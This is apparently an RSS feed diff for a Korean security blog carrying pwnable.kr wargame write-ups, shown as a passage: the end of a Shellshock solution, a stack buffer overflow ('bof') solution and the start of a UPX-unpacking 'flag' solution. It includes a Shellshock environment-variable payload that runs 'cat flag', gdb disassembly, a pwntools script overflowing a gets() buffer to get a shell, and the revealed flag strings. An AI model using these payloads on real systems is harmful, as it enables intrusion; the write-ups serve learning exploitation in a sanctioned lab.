+        &lt;span class=&#34;n&#34;&gt;setresuid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;getegid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;getegid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;getegid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;());&lt;/span&gt;
+        &lt;span class=&#34;n&#34;&gt;setresgid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;getegid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;getegid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;getegid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;());&lt;/span&gt;
+        &lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/home/shellshock/bash -c &amp;#39;echo shock_me&amp;#39;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;해당 취약점은 bash의 환경변수와 선언에서 나타는 버그이고, 이를 이용하면 exploit이 가능했다. 공격 구문은 아래와 같다.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Shell Shock : CVE-2014-6271&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;shellshock@pwnable:~$ &lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;() { echo hello; }; /bin/cat flag&amp;#39;&lt;/span&gt;
+shellshock@pwnable:~$ ./shellshock 
+only &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; I knew CVE-2014-6271 ten years ago..!!
+Segmentation fault &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;core dumped&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+        </item>
+        <item>
+        <title>pwnable.kr bof</title>
+        <link>https://appealso.github.io/p/pwnable.kr-bof/</link>
+        <pubDate>Sat, 22 Oct 2022 10:02:39 +0900</pubDate>
+        
+        <guid>https://appealso.github.io/p/pwnable.kr-bof/</guid>
+        <description>&lt;img src="https://appealso.github.io/p/pwnable.kr-bof/pwn.png" alt="Featured image of post pwnable.kr bof" /&gt;&lt;p&gt;해당 문제를 실행하면 아래와 같은 코드가 주어진다.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;func&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
+	&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;overflowme&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+	&lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;overflow me : &amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+	&lt;span class=&#34;n&#34;&gt;gets&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;overflowme&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;	&lt;span class=&#34;c1&#34;&gt;// smash me!
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0xcafebabe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
+		&lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/bin/sh&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+	&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+		&lt;span class=&#34;n&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Nah..&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]){&lt;/span&gt;
+	&lt;span class=&#34;n&#34;&gt;func&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xdeadbeef&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+	&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;코드를 보면 gets라는 취약한 함수를 사용하는 것을 확인할 수 있고, 해당 코드에서 bof 공격이 가능한 것을 확인 할 수 있었다.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;pwndbg&amp;gt; disassemble main
+Dump of assembler code for function main:
+   0x0000068a &amp;lt;+0&amp;gt;:	push   ebp
+   0x0000068b &amp;lt;+1&amp;gt;:	mov    ebp,esp
+   0x0000068d &amp;lt;+3&amp;gt;:	and    esp,0xfffffff0
+   0x00000690 &amp;lt;+6&amp;gt;:	sub    esp,0x10
+   0x00000693 &amp;lt;+9&amp;gt;:	mov    DWORD PTR [esp],0xdeadbeef
+   0x0000069a &amp;lt;+16&amp;gt;:	call   0x62c &amp;lt;func&amp;gt;
+   0x0000069f &amp;lt;+21&amp;gt;:	mov    eax,0x0
+   0x000006a4 &amp;lt;+26&amp;gt;:	leave
+   0x000006a5 &amp;lt;+27&amp;gt;:	ret
+End of assembler dump.
+pwndbg&amp;gt; disassemble func
+Dump of assembler code for function func:
+   0x0000062c &amp;lt;+0&amp;gt;:	push   ebp
+   0x0000062d &amp;lt;+1&amp;gt;:	mov    ebp,esp
+   0x0000062f &amp;lt;+3&amp;gt;:	sub    esp,0x48
+   0x00000632 &amp;lt;+6&amp;gt;:	mov    eax,gs:0x14
+   0x00000638 &amp;lt;+12&amp;gt;:	mov    DWORD PTR [ebp-0xc],eax
+   0x0000063b &amp;lt;+15&amp;gt;:	xor    eax,eax
+   0x0000063d &amp;lt;+17&amp;gt;:	mov    DWORD PTR [esp],0x78c
+   0x00000644 &amp;lt;+24&amp;gt;:	call   0x645 &amp;lt;func+25&amp;gt;
+   0x00000649 &amp;lt;+29&amp;gt;:	lea    eax,[ebp-0x2c]
+   0x0000064c &amp;lt;+32&amp;gt;:	mov    DWORD PTR [esp],eax
+   0x0000064f &amp;lt;+35&amp;gt;:	call   0x650 &amp;lt;func+36&amp;gt;
+   0x00000654 &amp;lt;+40&amp;gt;:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
+   0x0000065b &amp;lt;+47&amp;gt;:	jne    0x66b &amp;lt;func+63&amp;gt;
+   0x0000065d &amp;lt;+49&amp;gt;:	mov    DWORD PTR [esp],0x79b
+   0x00000664 &amp;lt;+56&amp;gt;:	call   0x665 &amp;lt;func+57&amp;gt;
+   0x00000669 &amp;lt;+61&amp;gt;:	jmp    0x677 &amp;lt;func+75&amp;gt;
+   0x0000066b &amp;lt;+63&amp;gt;:	mov    DWORD PTR [esp],0x7a3
+   0x00000672 &amp;lt;+70&amp;gt;:	call   0x673 &amp;lt;func+71&amp;gt;
+   0x00000677 &amp;lt;+75&amp;gt;:	mov    eax,DWORD PTR [ebp-0xc]
+   0x0000067a &amp;lt;+78&amp;gt;:	xor    eax,DWORD PTR gs:0x14
+   0x00000681 &amp;lt;+85&amp;gt;:	je     0x688 &amp;lt;func+92&amp;gt;
+   0x00000683 &amp;lt;+87&amp;gt;:	call   0x684 &amp;lt;func+88&amp;gt;
+   0x00000688 &amp;lt;+92&amp;gt;:	leave
+   0x00000689 &amp;lt;+93&amp;gt;:	ret
+End of assembler dump.
+pwndbg&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;gdb를 사용하여 코드를 분석해보면 overflowme 부터 key를 비교하기 전까지 52byte가 차이나는 것을 볼 수 있다. 답을 도출하기 위해 아래와 같은 코드를 작성하여 답을 얻을 수 있었다.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;0x2c(44) ~ ebp+0x8(8) = 52&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;r&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;pwnable.kr&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;9000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;52&lt;/span&gt; 
+&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xcafebabe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt; python3 ./pwnable.kr_bof.py              
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Opening connection to pwnable.kr on port 9000: Done
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Switching to interactive mode
+$ cat flag
+daddy, I just pwned a buFFer :&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+        </item>
+        <item>
+        <title>pwnable.kr flag</title>
+        <link>https://appealso.github.io/p/pwnable.kr-flag/</link>
+        <pubDate>Sat, 22 Oct 2022 10:02:39 +0900</pubDate>
+        
+        <guid>https://appealso.github.io/p/pwnable.kr-flag/</guid>
+        <description>&lt;img src="https://appealso.github.io/p/pwnable.kr-flag/pwn.png" alt="Featured image of post pwnable.kr flag" /&gt;&lt;p&gt;해당 문제를 실행하면 오류가 발생한다. 파일이 패키징되어 있다고 추측이 되었고, 이를 확인하기 위해 아래와같은 명령어를 사용하여 확인하여 upx 패킹이 되어있는 것을 확인 할 수 있었다.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;base&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  ✘ KIM 🔥   ~/Downloads
+ strings ./flag&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep packed
+&lt;span class=&#34;nv&#34;&gt;$Info&lt;/span&gt;: This file is packed with the UPX executable packer http://upx.sf.net $
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;upx 언패킹을 하기위해 아래와같이 실행하여 언패킹을 해주었다.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;base&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  KIM 🔥   ~/Downloads
+ upx -d flag
+                       Ultimate Packer &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; eXecutables
+                          Copyright &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;C&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1996&lt;/span&gt; - &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
+UPX 3.96        Markus Oberhumer, Laszlo Molnar &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; John Reiser   Jan 23rd &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
+
+        File size         Ratio      Format      Name
+   --------------------   ------   -----------   -----------
+    &lt;span class=&#34;m&#34;&gt;883745&lt;/span&gt; &amp;lt;-    &lt;span class=&#34;m&#34;&gt;335288&lt;/span&gt;   37.94%   linux/amd64   flag
+
+Unpacked &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; file.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;아래 코드를 분석해보면 0x6c2070 에 플래그가 들어있는 것을 확인 할 수 있었고, x/1s *0x6c2070를 입력하여 답을 얻을 수 있었다.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;&lt;span class=&#34;nf&#34;&gt;pwndbg&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;disassemble&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;
+&lt;span class=&#34;nf&#34;&gt;Dump&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;assembler&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;code&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+   &lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x0000000000401164&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;push&lt;/span&gt;   &lt;span class=&#34;no&#34;&gt;rbp&lt;/span&gt;
+   &lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x0000000000401165&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;rbp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;rsp&lt;/span&gt;
+   &lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x0000000000401168&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;sub&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;rsp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0x10&lt;/span&gt;
+   &lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x000000000040116c&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;edi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0x496658&lt;/span&gt;
+   &lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x0000000000401171&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;13&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;call&lt;/span&gt;   &lt;span class=&#34;mh&#34;&gt;0x402080&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;puts&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+   &lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x0000000000401176&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;18&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;edi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0x64&lt;/span&gt;
+   &lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x000000000040117b&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;23&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;call&lt;/span&gt;   &lt;span class=&#34;mh&#34;&gt;0x4099d0&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;malloc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+   &lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x0000000000401180&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;28&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;QWORD&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;PTR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;rbp-0x8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;rax&lt;/span&gt;
+   &lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x0000000000401184&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;rdx&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;QWORD&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;PTR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;rip&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0x2c0ee5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;        &lt;span class=&#34;c&#34;&gt;# 0x6c2070 &amp;lt;flag&amp;gt;
+&lt;/span&gt;&lt;span class=&#34;c&#34;&gt;&lt;/span&gt;   &lt;span class=&#34;mi&#34;&gt;0x000000000040118b&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;39&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;rax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;QWORD&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;PTR&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;rbp-0x8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+   &lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x000000000040118f&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;43&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;rsi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;rdx&lt;/span&gt;
+   &lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x0000000000401192&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;46&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;rdi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;rax&lt;/span&gt;
+   &lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x0000000000401195&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;49&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;call&lt;/span&gt;   &lt;span class=&#34;mi&#34;&gt;0x400320&lt;/span&gt;
+   &lt;span class=&#34;err&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x000000000040119a&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;54&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;	&lt;span class=&#34;no&#34;&gt;mov&lt;/span&gt;    &lt;span class=&#34;no&#34;&gt;eax&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0x0&lt;/span&gt;
